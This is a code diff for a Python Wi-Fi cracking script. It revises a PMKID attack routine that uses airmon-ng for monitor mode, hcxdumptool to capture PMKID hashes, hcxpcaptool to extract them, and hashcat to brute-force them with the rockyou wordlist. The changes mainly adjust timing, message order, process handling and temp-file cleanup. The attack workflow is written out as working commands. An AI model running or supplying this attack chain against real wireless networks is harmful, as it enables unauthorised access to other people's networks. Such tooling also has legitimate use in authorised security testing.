@@ -8,11 +8,11 @@ from colorama import Fore
 
 def ctrl_c(signum, frame):
     get_colours("\n[!] Stopping attack...", "mangeta")
+    get_colours("\n[!] Clearing Temporary files..", "red")
     get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
     get_colours("\n[*] Network set to it's normal mode...", "yellow")
-    get_colours("\nClearing Temporary files..", "red")
     os.system("rm -rf Cap*")
     time.sleep(2)
     get_colours("\n[*] Exiting the program...", "blue")
@@ -159,12 +159,15 @@ def attack_func(network_interface, attack_mode):
         get_colours("Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
         get_colours("", "yellow")
-        process = subprocess.Popen(f"sudo hcxdumptool -i {network_interface}mon --enable_status=1 -o Capture_PKMID",
-                                   shell=True)
-        time.sleep(10)
-        process.send_signal(signal.SIGINT)
+        process = subprocess.Popen(["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
+        try:
+            process.wait(timeout=5)  # Time for the process
+        except subprocess.TimeoutExpired:
+            print('\n[!] Timed out - killing process ID - ', process.pid)
+            process.kill()
+        time.sleep(2)
         subprocess.run(["clear"])
-        get_colours("\nClearing Temporary files..", "red")
+        get_colours("\n[!] Clearing Temporary files..", "red")
         print(Fore.WHITE)
         time.sleep(3)
         get_colours("", "yellow")
@@ -172,9 +175,10 @@ def attack_func(network_interface, attack_mode):
         get_pkmid_hashes = subprocess.run(["sudo hcxpcaptool -z myHashes_PKMID Capture_PKMID"],
                                           capture_output=True, text=True, shell=True)
         subprocess.run(["clear"])
-        get_colours("\n[*] Trying getting hashes", "magenta")
         time.sleep(2)
+        get_colours("\n[*] Trying getting hashes", "magenta")
         subprocess.run(["rm", "Capture_PKMID"])
+        time.sleep(2)
         if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
             get_colours("\nStarting with Brute-Force attack..", "cyan")
             time.sleep(3)
@@ -182,21 +186,22 @@ def attack_func(network_interface, attack_mode):
             subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
                             "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
         else:
-            time.sleep(1)
+            subprocess.run(["clear"])
             get_colours("\n[-] no packet captured...", "red")
+            time.sleep(2)
+            subprocess.run(["clear"])
             quit_program()
 
 
 def quit_program():
-    get_colours("\n[*] Exiting the program...", "blue")
+    get_colours("\n[!] Clearing Temporary files..", "red")
+    get_colours("\n[!] Exiting the program...", "blue")
     get_colours("\nSetting Network interface to it normal mode..", "mangeta")
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
-    get_colours("Network set to it's normal mode...", "magenta")
-    get_colours("\nClearing Temporary files..", "red")
+    get_colours("[*] Network set to it's normal mode...", "magenta")
     os.system("rm -rf Cap*")
     print(Fore.WHITE)
-    time.sleep(3)
     exit(0)
 
 
